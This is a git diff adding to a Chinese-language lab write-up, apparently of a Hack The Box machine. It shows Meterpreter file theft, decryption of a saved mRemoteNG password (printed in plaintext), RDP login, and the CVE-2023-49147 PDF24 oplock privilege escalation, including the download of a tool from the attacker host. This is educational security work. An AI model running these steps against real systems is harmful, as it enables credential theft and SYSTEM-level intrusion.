@@ -309,9 +309,134 @@ type config.xml
 <SNIP>
 </mrng:Connections>
 ```
-#### 这是一个远程桌面管理应用程序mRemoteNG的配置文件。该文件包括为Gale保存RDP会话。Dekarios。虽然密码是加密的，但mRemoteNG使用已知的AES-GCM加密方案，如果受保护的主密钥可用，则密码可以解密。来解密密码时，我们使用公开可用的Python脚本。
+#### 这是一个远程桌面管理应用程序mRemoteNG的配置文件。该文件包括为Gale保存RDP会话。Dekarios。虽然密码是加密的，但mRemoteNG使用已知的AES-GCM加密方案，如果受保护的主密钥可用，则密码可以解密。来解密密码时，解密 mRemoteNG 配置文件里保存的密码”的 Python 脚本
 https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
+#### 1.mremoteng_decrypt.py下载到本地
 ```
 [★]$ wget https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
 ```
-#### 把config.xml传送到本地
+#### 2.把config.xml传送到本地
+#### 小操作：exit推出cmd，会话会直接断掉。再次连接，不进入(shell)cmd,在meterpreter里直接download
+```
+(Meterpreter 1)(c:\windows\system32\inetsrv) > cd C:\\Users\\ellen.freeman\\Documents
+(Meterpreter 1)(C:\Users\ellen.freeman\Documents) > ls
+Listing: C:\Users\ellen.freeman\Documents
+=========================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2023-12-27 13:02:47 -0600  My Music
+040777/rwxrwxrwx  0     dir   2023-12-27 13:02:47 -0600  My Pictures
+040777/rwxrwxrwx  0     dir   2023-12-27 13:02:47 -0600  My Videos
+100666/rw-rw-rw-  3341  fil   2023-12-28 07:59:58 -0600  config.xml
+100666/rw-rw-rw-  402   fil   2023-12-28 07:58:22 -0600  desktop.ini
+
+(Meterpreter 1)(C:\Users\ellen.freeman\Documents) > download config.xml
+[*] Downloading: config.xml -> /home/syareya55/Lock/website/config.xml
+[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): config.xml -> /home/syareya55/Lock/website/config.xml
+[*] Completed  : config.xml -> /home/syareya55/Lock/website/config.xml
+```
+#### 在本地执行mremoteng_decrypt.py对config.xml
+```
+[~/Lock/website]
+└──╼[★]$ ls
+assets         config.xml  mremoteng_decrypt.py  rev.aspx
+changelog.txt  index.html  readme.md
+[~/Lock/website]
+└──╼ [★]$ python3 mremoteng_decrypt.py config.xml
+Name: RDP/Gale
+Hostname: Lock
+Username: Gale.Dekarios
+Password: ty8wnW9qCKDosXo6
+```
+#### 这将成功地显示RDP凭据。有了这些凭据，我们就能够建立一个RDP会话对着机器。
+```
+[★]$ xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
+```
+#### 进入了windows
+
+## Privilege Escalation
+#### 在桌面上，我们也观察到PDF24已经安装。同时寻找可能的本地特权影响PDF24的升级漏洞，我们遇到了CVE-2023-49147。我们也看到了这篇文章关于如何利用它。漏洞版本最高可达11.15.1。检查安装的版本，我们看到它是11.15.1。
+![图片](image/121504.png)
+https://nvd.nist.gov/vuln/detail/CVE-2023-49147
+#### 描述
+#### PDF24 Creator 11.14.0 中发现了一个问题。经查明，msi 安装程序文件的配置在使用 msiexec.exe 的修复功能时会生成一个可见的 cmd.exe 窗口。这使得没有特权的本地攻击者可以利用一系列操作（例如，对 faxPrnInst.log 进行 oplock 操作）来打开一个 SYSTEM 权限的 cmd.exe 文件。
+https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/
+#### 该漏洞要求通过MSI安装程序安装PDF24。搜索系统，我们发现了一个安装目录在C:\ drive。
+```
+(Meterpreter 1)(c:\windows\system32\inetsrv) > cd C:\\
+(Meterpreter 1)(C:\) > dir
+
+
+(Meterpreter 1)(C:\) > cd _install\\
+(Meterpreter 1)(C:\_install) > dir
+Listing: C:\_install
+====================
+
+Mode             Size       Type  Last modified             Name
+----             ----       ----  -------------             ----
+100666/rw-rw-rw  60804608   fil   2023-12-28 13:21:47 -060  Firefox Setup 121.0.msi
+-                                 0
+100666/rw-rw-rw  43593728   fil   2023-12-28 07:39:12 -060  mRemoteNG-Installer-1.76.
+-                                 0                         20.24615.msi
+100666/rw-rw-rw  462602240  fil   2023-12-14 12:07:16 -060  pdf24-creator-11.15.1-x64
+-                                 0                         .msi
+
+(Meterpreter 1)(C:\_install) >
+```
+#### 为了利用这个漏洞，我们从SymbolicLink-Testing-Tools下载了SetOpLock.exe实用程序
+```
+[★]$ wget https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z
+
+[★]$ 7z x Release.7z
+```
+#### 我们在提取的内容中识别SetOpLock.exe二进制文件。
+```
+[★]$ ll
+total 1.7M
+drwxr-xr-x 6 syareya55 syareya55 4.0K Dec 15 02:22 assets
+-rw-r--r-- 1 syareya55 syareya55 129K Mar 24  2017 BaitAndSwitch.exe
+-rw-r--r-- 1 syareya55 syareya55   43 Dec 15 02:22 changelog.txt
+-rw-r--r-- 1 syareya55 syareya55 3.3K Dec 28  2023 config.xml
+-rw-r--r-- 1 syareya55 syareya55 114K Mar 24  2017 CreateDosDeviceSymlink.exe
+-rw-r--r-- 1 syareya55 syareya55 114K Mar 24  2017 CreateHardlink.exe
+-rw-r--r-- 1 syareya55 syareya55 114K Mar 24  2017 CreateMountPoint.exe
+-rw-r--r-- 1 syareya55 syareya55 118K Mar 24  2017 CreateNativeSymlink.exe
+-rw-r--r-- 1 syareya55 syareya55 116K Mar 24  2017 CreateNtfsSymlink.exe
+-rw-r--r-- 1 syareya55 syareya55 119K Mar 24  2017 CreateObjectDirectory.exe
+-rw-r--r-- 1 syareya55 syareya55 113K Mar 24  2017 CreateRegSymlink.exe
+-rw-r--r-- 1 syareya55 syareya55 127K Mar 24  2017 CreateSymlink.exe
+-rw-r--r-- 1 syareya55 syareya55 112K Mar 24  2017 DeleteMountPoint.exe
+-rw-r--r-- 1 syareya55 syareya55 110K Mar 24  2017 DumpReparsePoint.exe
+-rw-r--r-- 1 syareya55 syareya55  16K Dec 15 02:22 index.html
+-rw-r--r-- 1 syareya55 syareya55  12K Dec  7  2015 LICENSE.txt
+-rw-r--r-- 1 syareya55 syareya55 3.4K Dec 15 02:22 mremoteng_decrypt.py
+-rw-r--r-- 1 syareya55 syareya55  130 Dec 15 02:22 readme.md
+-rw-r--r-- 1 syareya55 syareya55  836 Mar 24  2017 README.txt
+-rw-r--r-- 1 syareya55 syareya55 193K Dec 15 03:23 Release.7z
+-rw-r--r-- 1 syareya55 syareya55 3.6K Dec 15 02:35 rev.aspx
+-rw-r--r-- 1 syareya55 syareya55 114K Mar 24  2017 SetOpLock.exe
+```
+#### 为了将二进制文件传输到目标，我们使用python服务器在本地托管它
+
+```
+C:\Users\gale.dekarios>curl http://10.10.14.190:5001/SetOpLock.exe -o SetOpLock.exe                          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                             Dload  Upload   Total   Spent    Left  Speed                              100  113k  100  113k    0     0  1294k      0 --:--:-- --:--:-- --:--:-- 1351k                                                                                                                                        C:\Users\gale.dekarios>
+```
+#### 在本文的开发步骤之后，我们执行以下命令在PDF24使用的faxprininst .log文件。
+![图片](image/121505.png)
+##### 这个窗口会一直停留
+#### 安装好Oplock后，我们打开一个新的命令shell，并使用脆弱的PDF24 MSI安装程序。
+```
+C:\Users\gale.dekarios>cd c:\_install                                                                                                                                                                                 c:\_install>msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi                                                                                                                         
+```
+![图片](image/121506.png)
+#### 什么也阻止不了我安装 一直OK,OK. 
+![图片](image/121507.png)
+#### 命令执行完毕之后，会跳出第三个窗口,右键 Properties
+![图片](image/121508.png)
+#### 点击：legacy console mode 传统控制台模式
+![图片](image/121509.png)
+#### Firefox启动后，我们按Ctrl + O打开打开文件对话框。在对话框中，我们输入用于cmd.exe
+![图片](image/121510.png)
+#### CVE-2023-49147 msi 安装程序文件的配置在使用 msiexec.exe 的修复功能时会生成一个可见的 cmd.exe 窗口
+![图片](image/121511.png)
